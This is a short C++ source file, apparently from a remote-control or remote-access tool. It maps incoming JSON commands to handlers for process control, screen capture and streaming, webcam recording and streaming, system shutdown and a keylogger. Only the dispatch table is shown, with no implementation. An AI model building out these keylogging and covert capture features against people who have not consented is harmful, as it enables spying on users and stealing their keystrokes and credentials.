#include "Router.h"

json Router::dispatch(const std::unordered_map<std::string, Handler> &map, const json &req)
{
    std::string cmd = req.value("command", "");
    if (map.find(cmd) != map.end())
        return map.at(cmd)(req);

    return {{"type", "error"}, {"message", "unknown command: " + cmd}};
}

void Router::registerAllHandlers(std::unordered_map<std::string, Handler> &map)
{
    // Process handlers
    map["list_processes"] = ProcessHandlers::listProcesses;
    map["start_process"] = ProcessHandlers::startProcess;
    map["stop_process_pid"] = ProcessHandlers::stopProcessPid;

    // Application handlers
    map["list_applications"] = ProcessHandlers::listApps;
    map["start_application"] = ProcessHandlers::startApp;
    map["stop_application"] = ProcessHandlers::stopApp;

    // Screen capture & stream
    map["capture_screen"] = ProcessHandlers::captureScreen;
    map["start_screen_stream"] = ProcessHandlers::startScreenStream;
    map["stop_screen_stream"] = ProcessHandlers::stopScreenStream;

    // Webcam handlers
    map["start_webcam_record"] = ProcessHandlers::startWebcamRecord;
    map["stop_webcam_record"] = ProcessHandlers::stopWebcamRecord;
    map["start_webcam_stream"] = ProcessHandlers::startWebcamStream;
    map["stop_webcam_stream"] = ProcessHandlers::stopWebcamStream;

    // System control
    map["system_shutdown"] = ProcessHandlers::systemShutdown;
    map["system_restart"] = ProcessHandlers::systemRestart;

    // Keylogger
    map["start_keylog"] = ProcessHandlers::startKeylog;
    map["stop_keylog"] = ProcessHandlers::stopKeylog;
}
